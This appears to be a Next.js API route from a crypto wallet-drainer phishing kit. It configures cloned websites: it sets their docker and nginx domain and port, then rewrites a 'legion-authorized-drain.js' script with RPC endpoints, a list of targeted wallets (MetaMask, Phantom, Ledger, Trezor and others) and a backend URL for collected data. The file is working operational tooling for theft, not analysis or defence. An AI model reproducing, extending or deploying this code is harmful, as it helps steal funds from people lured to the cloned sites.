import { NextRequest, NextResponse } from 'next/server';
import { readFileSync, writeFileSync } from 'fs';
import { join } from 'path';
import { updateConfiguration, addLog, getClone } from '@/lib/db';

interface ConfigUpdate {
  cloneId: string;
  domain: string;
  port: number;
  enableSSL: boolean;
  backendUrl: string;
  rpcConfigs?: any;
  walletSettings?: any;
}

export async function POST(request: NextRequest) {
  try {
    const config: ConfigUpdate = await request.json();
    const { cloneId, domain, port, enableSSL, backendUrl, rpcConfigs, walletSettings } = config;

    const clone = getClone(cloneId);
    if (!clone) {
      return NextResponse.json(
        { success: false, error: 'Clone not found' },
        { status: 404 }
      );
    }

    const clonePath = join(process.cwd(), '..', 'clones', clone.name);
    addLog(cloneId, 'config', `Applying configuration to ${clone.name}`);

    try {
      // Update docker-compose.yml
      const dockerComposePath = join(clonePath, 'docker-compose.yml');
      let dockerCompose = readFileSync(dockerComposePath, 'utf-8');
      dockerCompose = dockerCompose.replace(
        /ports:\s*\n\s*-\s*"(\d+):80"/,
        `ports:\n      - "${port}:80"`
      );
      writeFileSync(dockerComposePath, dockerCompose);
      addLog(cloneId, 'config', `✅ Updated docker-compose.yml (port: ${port})`);

      // Update nginx.conf
      const nginxPath = join(clonePath, 'nginx.conf');
      let nginx = readFileSync(nginxPath, 'utf-8');
      nginx = nginx.replace(
        /server_name\s+[^;]+;/,
        `server_name ${domain};`
      );
      writeFileSync(nginxPath, nginx);
      addLog(cloneId, 'config', `✅ Updated nginx.conf (domain: ${domain})`);

      // Update drain script with RPC and wallet settings
      const drainScriptPath = join(clonePath, 'legion-authorized-drain.js');
      if (rpcConfigs || walletSettings) {
        let drainScript = readFileSync(drainScriptPath, 'utf-8');

        // Update RPC endpoints
        if (rpcConfigs) {
          drainScript = drainScript.replace(
            /const\s+EVM_RPC\s*=\s*['"][^'"]*['"]/,
            `const EVM_RPC = '${rpcConfigs.evm || 'https://eth-mainnet.infura.io/v3/YOUR_KEY'}'`
          );
          drainScript = drainScript.replace(
            /const\s+SOLANA_RPC\s*=\s*['"][^'"]*['"]/,
            `const SOLANA_RPC = '${rpcConfigs.solana || 'https://api.mainnet-beta.solana.com'}'`
          );
        }

        // Update wallet settings
        if (walletSettings) {
          drainScript = drainScript.replace(
            /WALLET_TARGETS\s*=\s*{[^}]*}/s,
            `WALLET_TARGETS = {
              metamask: ${walletSettings.metamask},
              coinbase: ${walletSettings.coinbase},
              trust: ${walletSettings.trust},
              phantom: ${walletSettings.phantom},
              rabby: ${walletSettings.rabby},
              solflare: ${walletSettings.solflare},
              walletConnect: ${walletSettings.walletConnect},
              ledger: ${walletSettings.ledger},
              trezor: ${walletSettings.trezor}
            }`
          );
          addLog(cloneId, 'config', `✅ Updated wallet targeting`);
        }

        // Update backend URL
        if (backendUrl) {
          drainScript = drainScript.replace(
            /const\s+BACKEND_URL\s*=\s*['"][^'"]*['"]/,
            `const BACKEND_URL = '${backendUrl}'`
          );
          addLog(cloneId, 'config', `✅ Updated backend URL`);
        }

        writeFileSync(drainScriptPath, drainScript);
        addLog(cloneId, 'config', `✅ Updated drain script`);
      }

      // Save to database
      updateConfiguration(cloneId, {
        rpcEvm: rpcConfigs?.evm,
        rpcSolana: rpcConfigs?.solana,
        rpcTron: rpcConfigs?.tron,
        rpcTon: rpcConfigs?.ton,
        rpcBitcoin: rpcConfigs?.bitcoin,
        ...walletSettings,
        backendUrl,
      });

      addLog(cloneId, 'config', '✅ Configuration saved successfully');

      return NextResponse.json({
        success: true,
        message: 'Configuration applied and saved',
        updated: {
          dockerCompose: true,
          nginx: true,
          drainScript: true,
          database: true,
        },
      });
    } catch (fileError) {
      addLog(cloneId, 'error', `File operation failed: ${String(fileError)}`);
      return NextResponse.json(
        { success: false, error: `Failed to update files: ${String(fileError)}` },
        { status: 500 }
      );
    }
  } catch (error) {
    return NextResponse.json(
      { success: false, error: String(error) },
      { status: 500 }
    );
  }
}
